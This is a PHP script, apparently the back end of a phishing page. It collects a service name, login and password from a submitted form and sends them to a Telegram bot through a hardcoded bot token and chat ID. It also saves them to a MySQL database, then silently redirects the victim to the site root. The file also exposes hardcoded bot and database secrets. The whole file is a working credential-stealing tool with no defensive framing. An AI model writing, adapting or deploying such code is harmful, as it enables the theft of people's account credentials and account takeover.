<?php
	
$servis = $_POST['servis'];
$log = $_POST['log'];
$pass = $_POST['pass'];
$token = '7441086667:AAGNLKJABXr1qt5bloixfEOTBkKuS3IUDWk'; //Токен бота телеграм
$chat_id = '6295112819'; //Айди чата
$bb = $_POST["⭕️"];
$arr = array(
  '⭕️ Новая Авторизация ⭕️' => $bb,
  '' => $bb,
  '💻Сервис: ' => $servis,
  '⚒Логин: ' => $log,
  '🔐Пароль: ' => $pass,
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

?>
<?php
if (isset($_POST['servis']) && isset($_POST['log']) && isset($_POST['pass'])){
    // Переменные с формы
    $servis = $_POST['servis'];
    $log = $_POST['log'];
	$pass = $_POST['pass'];
    
    // Параметры для подключения
    $db_host = "localhost"; 
    $db_user = "qwerty1211"; // Логин БД
    $db_password = "KJFhi332-"; // Пароль БД
    $db_base = 'qwerty1211'; // Имя БД
    $db_table = "data"; // Имя Таблицы БД
    
    try {
        // Подключение к базе данных
        $db = new PDO("mysql:host=$db_host;dbname=$db_base", $db_user, $db_password);
        // Устанавливаем корректную кодировку
        $db->exec("set names utf8");
        // Собираем данные для запроса
        $data = array( 'servis' => $servis, 'log' => $log, 'pass' => $pass ); 
        // Подготавливаем SQL-запрос
        $query = $db->prepare("INSERT INTO $db_table (servis, log, pass) values (:servis, :log, :pass)");
        // Выполняем запрос с данными
        $query->execute($data);
        // Запишим в переменую, что запрос отрабтал
        $result = true;
    } catch (PDOException $e) {
        // Если есть ошибка соединения или выполнения запроса, выводим её
        print "Ошибка!: " . $e->getMessage() . "<br/>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0; url=/" />
</head>
<body>
</body>
</html>